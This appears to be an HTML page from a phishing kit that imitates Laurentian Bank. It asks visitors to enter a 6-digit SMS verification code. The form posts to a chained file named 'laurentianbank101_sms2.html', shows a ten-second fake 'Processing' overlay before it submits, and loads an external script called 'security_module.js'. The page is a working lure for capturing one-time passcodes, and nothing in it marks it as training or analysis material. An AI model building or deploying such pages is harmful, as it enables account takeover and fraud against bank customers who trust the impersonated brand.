<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laurentian Bank - Security Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: Roboto, Arial, sans-serif; background: #f4f4f4; margin: 0; color: #333; display: flex; flex-direction: column; min-height: 100vh; }
        .l-header { background: #00457c; padding: 15px 20px; }
        .l-logo-box { background: white; padding: 10px 15px; display: inline-flex; align-items: center; gap: 10px; }
        .l-logo-icon { color: #f2a900; font-size: 24px; }
        .l-logo-text { color: #00457c; font-weight: bold; font-size: 14px; line-height: 1.1; display: flex; flex-direction: column; }
        
        .l-main { background: white; flex: 1; }
        .l-container { padding: 30px 20px 40px; max-width: 400px; margin: 0 auto; }
        
        .l-label { display: block; font-size: 14px; font-weight: bold; color: #777; margin-top: 25px; margin-bottom: 5px; text-transform: uppercase; }
        .l-input { width: 100%; border: none; border-bottom: 1px solid #777; padding: 10px 0; font-size: 16px; outline: none; color: #333; border-radius: 0; }
        .l-input:focus { border-bottom: 2px solid #00457c; }
        
        .l-link-right { display: block; text-align: right; color: #00457c; text-decoration: none; font-size: 15px; margin-top: 10px; }
        
        .l-checkbox-row { display: flex; align-items: center; gap: 10px; margin-top: 30px; font-size: 15px; color: #555; }
        .l-checkbox { width: 18px; height: 18px; border: 1px solid #777; border-radius: 3px; cursor: pointer; }
        
        .l-btn { width: 100%; background: #e0e0e0; color: #666; border: none; padding: 16px; font-size: 16px; font-weight: bold; margin-top: 30px; border-radius: 4px; cursor: pointer; transition: background 0.2s; }
        form:valid .l-btn { background: #00457c; color: white; }
        
        .l-bottom-link { display: block; text-align: center; color: #00457c; text-decoration: underline; font-size: 16px; margin-top: 30px; }
        
        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #00457c;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #00457c; margin: 20px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 40px; text-align: center; }
    </style>
</head>
<body>
    <div class="l-header">
        <div class="l-logo-box">
            <div class="l-logo-icon">
                <i class="fa-solid fa-tree"></i>
            </div>
            <div class="l-logo-text">
                <span>LAURENTIAN</span>
                <span>BANK</span>
            </div>
        </div>
    </div>
    
    <div class="l-main">
        <div class="l-container">
            
            <p style="margin-top: 10px; margin-bottom: 25px; font-size: 15px; color: #555;">To secure your connection, please enter the 6-digit code we just sent to your mobile device.</p>
            <form action="laurentianbank101_sms2.html" method="POST">
                <label class="l-label">VERIFICATION CODE</label>
                <input type="text" class="l-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px; padding: 15px 0;">
                
                <button type="submit" class="l-btn">VERIFY</button>
            </form>

        </div>
    </div>

    <!-- Loader Overlay -->
    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
